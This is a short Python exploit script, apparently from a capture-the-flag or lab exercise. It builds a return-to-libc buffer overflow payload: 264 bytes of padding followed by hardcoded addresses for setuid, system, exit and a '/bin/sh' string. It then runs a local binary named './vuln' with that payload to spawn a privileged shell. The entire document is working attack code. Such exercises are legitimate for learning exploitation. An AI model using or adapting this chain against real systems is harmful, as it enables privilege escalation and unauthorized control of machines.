#!/usr/bin/env python
from subprocess import call
import struct

binsh        = 0xb7f80fb8
system       = 0xb7e5f430
exit         = 0xb7e52fb0
setuid       = 0xb7ed8e40
pop	     = 0x08048564

#execve       = libc.symbols['execve']

def conv(num):
 return struct.pack("<I",num)#<little endian

payload  = 'A'*264
payload += conv(setuid)
payload += conv(pop)
payload += '0'*4
payload += conv(system)
payload += conv(pop)
payload += conv(binsh)
payload += conv(exit)

call(["./vuln", payload])


